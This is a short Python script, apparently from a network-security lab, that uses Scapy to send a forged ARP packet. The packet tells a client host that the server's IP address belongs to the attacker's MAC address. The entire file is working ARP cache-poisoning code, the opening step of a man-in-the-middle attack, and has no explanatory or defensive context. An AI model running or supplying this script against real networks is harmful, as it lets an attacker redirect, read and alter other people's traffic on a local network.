#!/usr/bin/python3
from scapy.all import *
import subprocess

# Define host IP and MAC addresses

client_ip = "10.0.2.10"
client_mac = "08:00:27:76:d6:32"

server_ip = "10.0.2.12"

attacker_ip = "10.0.2.14"
attacker_mac = "08:00:27:7b:ba:d7"


# Create Ethernet layer with source and destination MAC addresses
eth = Ether(src=attacker_mac, dst=client_mac)

# Create ARP layer with source and destination IP addresses
arp_request = ARP(hwsrc=attacker_mac,psrc=server_ip,
                  hwdst=client_mac, pdst=client_ip)

# Create the packet
pkt = eth/arp_request

# Send the packet
sendp(pkt)
